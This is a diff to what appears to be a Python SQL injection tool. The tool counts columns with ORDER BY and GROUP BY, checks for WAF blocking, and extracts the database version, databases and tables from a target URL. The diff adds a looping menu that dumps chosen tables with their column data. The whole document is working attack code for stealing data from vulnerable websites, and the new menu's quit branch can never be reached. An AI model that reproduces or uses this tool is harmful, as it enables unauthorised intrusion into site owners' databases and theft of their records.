@@ -176,7 +176,7 @@ class website:
 
     def columnCounterOrderBy(self):
         print("[+] Counting Columns")
-        baseUrl = self.url.strip("'") + " ORDER BY "
+        baseUrl = self.url.strip("'") + "+ORDER+BY+"
 
         msg = "Error: Unknown column"
 
@@ -200,7 +200,6 @@ class website:
             print("[!] Target might be blocking Query with WAF"+END)
             sys.exit(1)
             
-
     def columnCounterGroupBy(self):
         """
             2 Approaches
@@ -237,7 +236,6 @@ class website:
             print(RED+"[~] Could not find column with Group By")
             print("[~] Trying manual method with Order By"+END)
             self.columnCounterOrderBy() 
-
 
     def FindVulnColumnManual(self):
         # Change this if needed to detect the WAF Firewall
@@ -337,25 +335,18 @@ class website:
         try:
 
             self.version = self.parse(self.getpage(versionUrl))[0]
-            print("\n[+] Version   : %s" % self.version)
+            print(GREEN+"\n[+] Version   : %s" % self.version)
 
             self.databases = self.parse(self.getpage(databaseUrl))[0]
             print("[+] Databases : %s" % self.databases)
 
             self.tables = [str(i).strip(".:.") for i in self.parse(self.getpage(tableUrl))[0].split(",")]
-            print("[+] Tables    : %s" % "\n\t\t".join([str(i) for i in self.tables]))
+            self.menu()
+
         except IndexError:
             with open("debug.html","w") as cf:
                 cf.write(self.getpage(tableUrl))
             print("[!] Check Debug.html")
-            sys.exit(1)
-
-        tbl_choice = raw_input("Enter table name : ").lower()
-        if tbl_choice in self.tables:
-            self.dumpTable(tbl_choice)
-        elif tbl_choice != "" & tbl_choice not in self.tables:
-            print("[!] Table name [%s] is not in database" % tbl_choice)
-        else:
             sys.exit(1)
 
     def parse(self,data):
@@ -372,7 +363,7 @@ class website:
         columns = [str(i).strip(".:.") for i in raw_data.split(",")]
 
         if len(columns) > 0:
-            print("\n[+] Columns : %s" % columns)
+            print("[+] Columns : %s" % columns)
             self.extract_Data(columns,table)
         else:
             print("[-] No Columns Found")
@@ -388,13 +379,14 @@ class website:
             logging.info(query)
 
             raw_data = self.parse(self.getpage(query))[0]
-            data = [str(i).strip(".:.") for i in raw_data.split("|")]
-
-            print("\n")
-            print(data)
+            data = [str(i).strip(".:.") for i in raw_data.split(",")]
+            print(GREEN+"\n\t Table   : %s" % table)
+            print(GREEN+"\t Columns : %s" % ",".join([str(i) for i in column]))
+            print(YELLOW+"\t-------------------------------------"+END)
+            print(GREEN+"\t"+"\n\t".join([str(i) for i in data]))
+            print(YELLOW+"\t-------------------------------------"+END)
 
         except Exception:
-
             with open('debug.html','w') as cf:
                 cf.write(self.getpage(query))
             print("[!] Check debug.html")
@@ -411,6 +403,21 @@ class website:
             print(e)
             sys.exit(1)
 
+
+    def menu(self):
+        print(GREEN+"\n[+] Tables    : %s" % "\n\t\t".join([str(i) for i in self.tables]))
+
+        tbl_choice = raw_input(GREEN+"\nEnter table name : ").lower()
+        if tbl_choice in self.tables:
+            self.dumpTable(tbl_choice)
+            raw_input("Press Enter to go back")
+            self.menu()
+        elif tbl_choice not in self.tables:
+            print("[!] Table name [%s] is not in database" % tbl_choice)
+            self.menu()
+        elif tbl_choice == "quit" or tbl_choice == "exit":
+            print(RED+"[~] Exiting"+END)
+            sys.exit(1)    
 
 class Log:
     def __init__(self):
@@ -429,6 +436,8 @@ class Log:
         self.history = ""
 
         url = url[:url.index("=")]
+        # Take only the left portion of the url, since the log only records
+        # The union url
 
         for item in data:
             if url in item:
@@ -439,7 +448,7 @@ class Log:
         return self.data_Exist
 
     def read_log(self):
-        return [line.replace('\n', '') for line in open(session_log).readlines()]
+        return [line.strip('\n') for line in open(session_log).readlines()]
 
     def write_log(self,url):
         with open(session_log,'a') as session:
@@ -449,7 +458,7 @@ class Log:
 
 class URL:
     def __init__(self,url):
-        self.fullurl = url
+        self.fullurl = url.strip("-")
         if not "http" in self.fullurl:
             self.fullurl = "http://" + self.fullurl
         if not "'" in self.fullurl:
